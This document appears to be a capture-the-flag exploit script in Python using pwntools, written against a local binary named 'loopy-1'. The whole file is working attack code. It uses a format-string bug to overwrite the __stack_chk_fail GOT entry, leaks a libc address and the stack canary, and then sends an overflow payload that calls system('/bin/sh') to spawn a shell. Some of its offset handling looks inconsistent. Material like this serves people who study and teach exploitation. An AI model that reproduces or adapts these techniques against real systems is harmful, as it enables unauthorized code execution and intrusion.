#!/usr/bin/env python

from pwn import *

libc = ELF('./libc.so.6')
e = ELF('./loopy-1')
p = process('./loopy-1')
gdb.attach(p)

#offsets
leak_off = 0x1dad80
bin_off = 0x17eaaa
system_off = libc.symbols['system']

#get addr
stk = e.got['__stack_chk_fail']
vuln = e.symbols['vuln']
main = e.symbols['main']
fwrite_got = e.symbols['fwrite']
print hex(fwrite_got)

log.info('__stack_chk_fail: '+hex(stk))
log.info('vuln: '+hex(vuln))

#write vuln to stk check
payload = ''
payload+= fmtstr_payload(7, {stk:main})
payload+= 'A'*68
p.sendline(payload)

#leak addr
payload = ''
payload+= '%3$x'
p.sendlineafter('>', payload+'A'*(76-len(payload)))
p.recvuntil('You typed: ')
p.recv(4)
libc_base = u32(p.recv(4))
print libc_base
log.info('libc_base: '+hex(libc_base))

#get system and binsh
system = libc_base + system_off
log.info('system: '+hex(system))
binsh = libc_base + bin_off
log.info('/bin/sh :'+hex(binsh))

#leak canary
payload = ''
payload+= '%23$x'
p.sendlineafter('>', payload+'A'*(72-len(payload)))
p.recvuntil('You typed: ')
p.recv(4)
canary = u32(p.recv(4))
log.info('Canary: '+hex(canary))

#bustamove
payload = ''
payload+= 'A'*64
payload+= p32(canary)
payload+= 'A'*16
payload+= p32(system)
payload+= p32(binsh)
p.sendlineafter('>', payload)
p.interactive()

